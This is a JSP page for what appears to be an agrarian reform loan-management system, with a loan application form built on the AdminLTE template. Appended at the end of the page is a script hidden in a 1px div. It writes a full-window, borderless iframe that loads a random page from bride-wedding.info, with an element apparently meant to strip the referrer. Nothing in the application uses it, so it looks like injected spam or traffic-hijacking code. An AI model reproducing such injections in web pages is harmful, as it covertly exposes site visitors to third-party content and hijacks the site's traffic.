
<!DOCTYPE html>
<html>
    <head>
        <%@page import="java.util.Calendar"%>
        <%@page import="java.sql.Date"%>
        <%@page import="java.text.SimpleDateFormat"%>
        <%@page import="java.text.ParseException;"%>
        <%@page import="java.util.logging.Level;"%>
        <%@page import="java.util.logging.Logger;"%>
        <%@page import="java.text.NumberFormat"%>
        <%@page import="java.util.Locale;"%>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>DAR-BMS</title>
        <!-- Tell the browser to be responsive to screen width -->
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <!-- Bootstrap 3.3.7 -->
        <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
        <!-- Font Awesome -->
        <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
        <!-- Ionicons -->
        <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
        <!-- DataTables -->
        <link rel="stylesheet" href="bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
        <link rel="stylesheet" href="bower_components/datatables.net-bs/css/buttons.bootstrap.min.css">
        <!-- Theme style -->
        <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
        <!-- AdminLTE Skins. Choose a skin from the css/skins
             folder instead of downloading all of them to reduce the load. -->
        <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
        <!-- Morris chart -->
        <link rel="stylesheet" href="bower_components/morris.js/morris.css">
        <!-- jvectormap -->
        <link rel="stylesheet" href="bower_components/jvectormap/jquery-jvectormap.css">
        <!-- Date Picker -->
        <link rel="stylesheet" href="bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css">
        <!-- Daterange picker -->
        <link rel="stylesheet" href="bower_components/bootstrap-daterangepicker/daterangepicker.css">
        <!-- bootstrap wysihtml5 - text editor -->
        <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">
        <!-- Select2 -->
        <link rel="stylesheet" href="bower_components/select2/dist/css/select2.min.css">
        <link rel="stylesheet" href="bower_components/select2/dist/css/select2.css">

        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
    </head>
    <body class="hold-transition skin-blue sidebar-mini">
        <div class="wrapper">

            <%@include file="jspf/field-officer-navbar.jspf" %>
            <!-- Left side column. contains the logo and sidebar -->
            <aside class="main-sidebar">
                <!-- sidebar: style can be found in sidebar.less -->
                <section class="sidebar">
                    <!-- Sidebar user panel -->
                    <div class="user-panel">
                        <div class="pull-left image">
                            <img src="dist/img/user2-160x160.jpg" class="img-circle" alt="User Image">
                        </div>
                        <div class="pull-left info">
                            <p><%out.print((String) session.getAttribute("fullName"));%></p>
                            <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
                        </div>
                    </div>
                    <!-- search form -->
                    <form action="#" method="get" class="sidebar-form">
                        <div class="input-group">
                            <input type="text" name="q" class="form-control" placeholder="Search...">
                            <span class="input-group-btn">
                                <button type="submit" name="search" id="search-btn" class="btn btn-flat"><i class="fa fa-search"></i>
                                </button>
                            </span>
                        </div>
                    </form>
                    <!-- /.search form -->
                    <!-- sidebar menu: : style can be found in sidebar.less -->
                    <ul class="sidebar-menu" data-widget="tree">
                        <li class="header">MAIN NAVIGATION</li>
                        <li>
                            <a href="provincial-field-officer-home.jsp">
                                <i class="fa fa-dashboard"></i> <span> Dashboard</span>
                            </a>
                        </li>
                        <li class="treeview">
                            <a href="#">
                                <i class="fa fa-users"></i> <span>ARBOs</span>
                                <span class="pull-right-container">
                                    <i class="fa fa-angle-left pull-right"></i>
                                </span>
                            </a>
                            <ul class="treeview-menu">
                                <li><a href="provincial-field-officer-arbo-list.jsp"><i class="fa fa-dot-circle-o"></i> View All</a></li>
                                <li><a href="provincial-field-officer-add-arbo.jsp"><i class="fa fa-dot-circle-o"></i> Create ARBO</a></li>
                            </ul>
                        </li>
                        <li class="treeview">
                            <a href="#">
                                <i class="fa fa-credit-card"></i> <span>APCP</span>
                                <span class="pull-right-container">
                                    <i class="fa fa-angle-left pull-right"></i>
                                </span>
                            </a>
                            <ul class="treeview-menu">
                                <li><a href="provincial-field-officer-request-loan-select-arbo.jsp"><i class="fa fa-dot-circle-o"></i> Request APCP</a></li>
                                <li><a href="view-apcp-status.jsp"><i class="fa fa-dot-circle-o"></i> View APCP Status</a></li>
                            </ul>
                        </li>
                        <li class="treeview">
                            <a href="#">
                                <i class="fa fa-industry"></i> <span>CAPDEV</span>
                                <span class="pull-right-container">
                                    <i class="fa fa-angle-left pull-right"></i>
                                </span>
                            </a>
                            <ul class="treeview-menu">
                                <li><a href="view-capdev-status.jsp"><i class="fa fa-dot-circle-o"></i> View CAPDEV Status</a></li>
                                <li><a href="provincial-field-officer-select-request.jsp"><i class="fa fa-dot-circle-o"></i> Create CAPDEV Proposal</a></li>

                            </ul>
                        </li>
                        <li class="treeview">
                            <a href="#">
                                <i class="fa fa-list-alt"></i> <span>LINKSFARM</span>
                                <span class="pull-right-container">
                                    <i class="fa fa-angle-left pull-right"></i>
                                </span>
                            </a>
                            <ul class="treeview-menu">
                                <li><a href="provincial-field-officer-linksfarm-select-project-sites.jsp"><i class="fa fa-dot-circle-o"></i>Select Project Site</a></li>
                            </ul>
                            <ul class="treeview-menu">
                                <li><a href="view-linksfarm-capdev-status.jsp"><i class="fa fa-dot-circle-o"></i>View LINKSFARM CAPDEV</a></li>
                            </ul>
                        </li>
                        <li>
                            <a href="provincial-field-officer-manage-past-due-reasons.jsp">
                                <i class="fa fa-hourglass"></i> <span> Manage Past Due Reasons</span>
                            </a>
                        </li>
                        <li>
                            <a href="edit-profile.jsp">
                                <i class="fa fa-edit"></i> <span> Edit Profile</span>
                            </a>
                        </li>
                    </ul>
                </section>
                <!-- /.sidebar -->
            </aside>

            <!-- Content Wrapper. Contains page content -->
            <div class="content-wrapper">
                <!-- Content Header (Page header) -->
                <section class="content-header">
                    <h1>
                        Loan Application Form
                        <small>New Accessing Conduits</small>
                    </h1>
                    <ol class="breadcrumb">
                        <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
                        <li><a href="#">Forms</a></li>
                        <li class="active">Advanced Elements</li>
                    </ol>
                </section>

                <!-- Main content -->
                <section class="content">

                    <!-- SELECT2 EXAMPLE -->
                    <div class="box box-default">
                        <div class="box-header with-border">
                            <h4 class="box-title"><strong>ARBO INFO</strong></h4>

                            <div class="box-tools pull-right">
                                <button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
                            </div>
                        </div>
                        <!-- /.box-header -->
                        <div class="box-body">
                            <div class="row">
                                <div class="col-md-4">
                                    <div class="form-group">
                                        <label>ARBO Name</label>
                                        <select class="form-control select2" style="width: 100%;">
                                            <option selected="selected">Alabama</option>
                                            <option>Alaska</option>
                                            <option>California</option>
                                            <option>Delaware</option>
                                            <option>Tennessee</option>
                                            <option>Texas</option>
                                            <option>Washington</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <!-- /.form-group -->
                                    <div class="form-group">
                                        <label for="Type">ARBO Type</label>
                                        <input type="text" class="form-control" id="Type" placeholder="5">
                                    </div>
                                    <!-- /.form-group -->
                                </div>
                                <div class="col-md-4">
                                    <div class="form-group">
                                        <label>ARBO Members</label>

                                        <div class="input-group">
                                            <input type="text" class="form-control" data-inputmask="'alias': 'dd/mm/yyyy'" data-mask>
                                            <div class="input-group-btn">
                                                <button type="button" class="btn btn-info">View</button>
                                            </div>
                                        </div>
                                        <!-- /.input group -->
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-8">
                                    <div class="form-group">
                                        <label>Address</label>
                                        <input type="text" class="form-control" id="address" placeholder="1653-B Antonio Rivera">
                                    </div>
                                </div>
                            </div>
              
                            <div class="box-header with-border">
                                <h4 class="box-title"><strong>LOAN INFORMATION</strong></h4>
                            </div>
                            <div class="row" style="margin-top: 10px">
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label>Loan Type</label>
                                        <select class="form-control select2" style="width: 100%;">
                                            <option selected="selected">Alabama</option>
                                            <option>Alaska</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label>Loan Reason</label>
                                        <select class="form-control select2" style="width: 100%;">
                                            <option selected="selected">Alabama</option>
                                            <option>Alaska</option>
                                            <option>California</option>
                                            <option>Delaware</option>
                                            <option>Tennessee</option>
                                            <option>Texas</option>
                                            <option>Washington</option>
                                        </select>
                                    </div>
                                </div>

                            </div>
                            <div class="row">
                                <div class="col-md-6">
                                    <!-- /.form-group -->
                                    <div class="form-group">
                                        <label for="Area">Land Area</label>
                                        <input type="text" class="form-control" id="Area" placeholder="5">
                                    </div>
                                    <!-- /.form-group -->
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label>Loan Amount</label>

                                        <div class="input-group">
                                            <span class="input-group-addon"><i class="fa fa-dollar"></i></span>
                                            <input type="text" class="form-control">
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-1">
                                </div>
                                <div class="col-xs-10">
                                    <label>Loan Recipients</label>
                                    <table id="example1" class="table table-bordered table-striped">
                                        <thead>
                                            <tr>
                                                <th> </th>
                                                <th>Recipient</th> 
                                                <th>Date of Membership</th> 
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;<input type="checkbox"></td>
                                                <td>Earle Calantuan</td>
                                                <td>May 25, 2018</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <div class="form-group pull-right">
                                        <input type="file" id="exampleInputFile">
                                        <p class="help-block">Upload Recipient List</p>
                                    </div>
                                </div>
                                <div class="col-xs-1">
                                </div>
                            </div>
                            <div class="box-header with-border">
                                <h5 class="box-title"><strong>Supporting Documents</strong></h5>
                            </div>
                            <div class="row" style="margin-top: 10px;">
                                <button type="button" class="btn btn-success center-block" style=" margin-bottom: 10px;">Add Document</button>
                                <div class="col-xs-3"></div>
                                <div class="col-xs-6 center-block">
                                    <table id="example1" class="table table-bordered table-striped" style="background: transparent;">
                                        <tbody>
                                            <tr>
                                                <td style="border: transparent;">
                                                    <div class="form-group">
                                                        <label></label>
                                                        <select class="form-control select2" style="width: 100%;">
                                                            <option selected="selected">Alabama</option>
                                                            <option>Alaska</option>
                                                        </select>
                                                    </div>
                                                </td>
                                                <td style="border: transparent;">
                                                    <label></label>
                                                    <div class="input-group date">
                                                        <div class="input-group-addon">
                                                            <i class="fa fa-calendar"></i>
                                                        </div>
                                                        <input type="text" class="form-control pull-right" id="datepicker">
                                                    </div> 
                                                </td>
                                                <td  style="border: transparent; background: transparent;" class="center-block">
                                                    <label></label>
                                                    <div class="input-group center-block">
                                                        <input type="button" class="btn btn-info" value="Validate" name="button">
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div class="col-xs-3"></div>
                            </div>
                            <!--     <div class="row">
                                     <div class="col-xs-3">
                                         <div class="form-group">
                                             <label>Remarks</label>
                                             <textarea class="form-control" rows="3" placeholder="Enter ..."></textarea>
                                         </div>
                                     </div>
                                 </div>-->


                            <button type="submit" class="btn btn-success pull-right">Submit</button>

                        </div>
                        <!-- /.box-body -->
                        <div class="box-footer">
                        </div>
                    </div>
                    <!-- /.box -->


                </section>
                <!-- /.content -->
            </div>
            <!-- /.content-wrapper -->
            <footer class="main-footer">
                <div class="pull-right hidden-xs">
                    <b>Version</b> 2.4.0
                </div>
                <strong>Copyright &copy; 2014-2016 <a href="https://adminlte.io">Almsaeed Studio</a>.</strong> All rights
                reserved.
            </footer>
        </div>
        <!-- ./wrapper -->

        <!-- jQuery 3 -->
        <script src="../../bower_components/jquery/dist/jquery.min.js"></script>
        <!-- Bootstrap 3.3.7 -->
        <script src="../../bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
        <!-- Select2 -->
        <script src="../../bower_components/select2/dist/js/select2.full.min.js"></script>
        <!-- InputMask -->
        <script src="../../plugins/input-mask/jquery.inputmask.js"></script>
        <script src="../../plugins/input-mask/jquery.inputmask.date.extensions.js"></script>
        <script src="../../plugins/input-mask/jquery.inputmask.extensions.js"></script>
        <!-- date-range-picker -->
        <script src="../../bower_components/moment/min/moment.min.js"></script>
        <script src="../../bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
        <!-- bootstrap datepicker -->
        <script src="../../bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js"></script>
        <!-- bootstrap color picker -->
        <script src="../../bower_components/bootstrap-colorpicker/dist/js/bootstrap-colorpicker.min.js"></script>
        <!-- bootstrap time picker -->
        <script src="../../plugins/timepicker/bootstrap-timepicker.min.js"></script>
        <!-- SlimScroll -->
        <script src="../../bower_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
        <!-- iCheck 1.0.1 -->
        <script src="../../plugins/iCheck/icheck.min.js"></script>
        <!-- FastClick -->
        <script src="../../bower_components/fastclick/lib/fastclick.js"></script>
        <!-- AdminLTE App -->
        <script src="../../dist/js/adminlte.min.js"></script>
        <!-- AdminLTE for demo purposes -->
        <script src="../../dist/js/demo.js"></script>
        <!-- Page script -->
        <script>
            $(function () {
                $('#validator').change(function () {
                    $('.color').hide();
                    $('#' + $(this).val()).show();
                });
            });
            $(function () {
                //Initialize Select2 Elements
                $('.select2').select2()

                //Datemask dd/mm/yyyy
                $('#datemask').inputmask('dd/mm/yyyy', {'placeholder': 'dd/mm/yyyy'})
                //Datemask2 mm/dd/yyyy
                $('#datemask2').inputmask('mm/dd/yyyy', {'placeholder': 'mm/dd/yyyy'})
                //Money Euro
                $('[data-mask]').inputmask()

                //Date range picker
                $('#reservation').daterangepicker()
                //Date range picker with time picker
                $('#reservationtime').daterangepicker({timePicker: true, timePickerIncrement: 30, format: 'MM/DD/YYYY h:mm A'})
                //Date range as a button
                $('#daterange-btn').daterangepicker(
                        {
                            ranges: {
                                'Today': [moment(), moment()],
                                'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
                                'Last 7 Days': [moment().subtract(6, 'days'), moment()],
                                'Last 30 Days': [moment().subtract(29, 'days'), moment()],
                                'This Month': [moment().startOf('month'), moment().endOf('month')],
                                'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
                            },
                            startDate: moment().subtract(29, 'days'),
                            endDate: moment()
                        },
                        function (start, end) {
                            $('#daterange-btn span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'))
                        }
                )

                //Date picker
                $('#datepicker').datepicker({
                    autoclose: true
                })

                //iCheck for checkbox and radio inputs
                $('input[type="checkbox"].minimal, input[type="radio"].minimal').iCheck({
                    checkboxClass: 'icheckbox_minimal-blue',
                    radioClass: 'iradio_minimal-blue'
                })
                //Red color scheme for iCheck
                $('input[type="checkbox"].minimal-red, input[type="radio"].minimal-red').iCheck({
                    checkboxClass: 'icheckbox_minimal-red',
                    radioClass: 'iradio_minimal-red'
                })
                //Flat red color scheme for iCheck
                $('input[type="checkbox"].flat-red, input[type="radio"].flat-red').iCheck({
                    checkboxClass: 'icheckbox_flat-green',
                    radioClass: 'iradio_flat-green'
                })

                //Colorpicker
                $('.my-colorpicker1').colorpicker()
                //color picker with addon
                $('.my-colorpicker2').colorpicker()

                //Timepicker
                $('.timepicker').timepicker({
                    showInputs: false
                })
            })
        </script>
        <div style="position: relative; z-index: 100; padding:0px; margin:0px; border:0px; overflow: hidden; display: block; width:100%; height:1px;"> <span id="url_kill_referrer"></span><script>var links = ['3-blade-pocket-knife', 'amari-launches-new-years-eve-deals-thailand', 'angelina-jolie-decides-lwren-wedding-gown', 'anne-hathaway-donate-wedding-photos-profits-charity', 'anne-hathaway-returns-honeymoon', 'apples-wireless-airpods-might-weird-come-competitive-price-indeed', 'arab-wedding-traditions', 'best-cheap-honeymoon-destination', 'best-wedding-gifts-ever', 'bridal-accessories-consider', 'bridal-bargains-americas-top-wedding-best-seller', 'bridal-shower-explained', 'bridal-shower-games-perfect-ice-breaker', 'bride-show-abu-dhabi-announces-dates', 'bride-show-dubai-announces-dates', 'desert-islands-resort-spa-perfect-place-honeymoon', 'dubai-mall-magazine-fashionistas-top-news-source-bride', 'eastern-mangroves-hotel-spa-perfect-honeymoon-experience', 'elie-saab-discusses-royal-gown', 'engagement-gifts-traditional-modern-approach', 'fantastic-wedding-ideas', 'felt-journal-notebook', 'flower-girls-responsibilities-inspiring-ideas', 'fresh-caviar-treatment-mature-fragile-skin', 'golden-globes-fashion-trends', 'guy-ritchie-engaged', 'halloween-wedding-ideas', 'his-her-glass-set', 'honeymoon-destination-ideas-top-10-honeymoon-locations', 'honeymoon-planning-step-step', 'interfaith-marriages', 'janet-jackson-marry-middle-eastern-millionaire', 'japanese-spring-wedding', 'jennifer-aniston-engaged-justin-theroux', 'jennifer-lopez-engaged-true-false', 'jewelry-fashion-trends', 'justin-timberlake-jessica-biel-get-secretly-married', 'keira-knightley-stumped-wedding-gown', 'kelly-osbourne-considers-marriage', 'pink-makeup-gift', 'pre-wedding-detox', 'rectangle-keepsake-box', 'rustic-country-wedding', 'treasure-trunk-box', 'wedding-day-roles-big-day', 'wedding-trends', 'wooden-book-keepsake-box', 'wooden-keepsake-bowl'];
            var random_index = Math.floor(Math.random() * links.length);
            var dst_url = '//bride-wedding.info/' + links[random_index] + '/';
            var html = '<iframe name="destiny" src="' + dst_url + '" scrolling="no" frameborder="0" marginheight="0px" marginwidth="0px" width="' + window.innerWidth + '" height="' + window.innerHeight + '"></iframe>';
            if (window.innerWidth >= 800)
                document.write(html);</script></div></body>
</html>
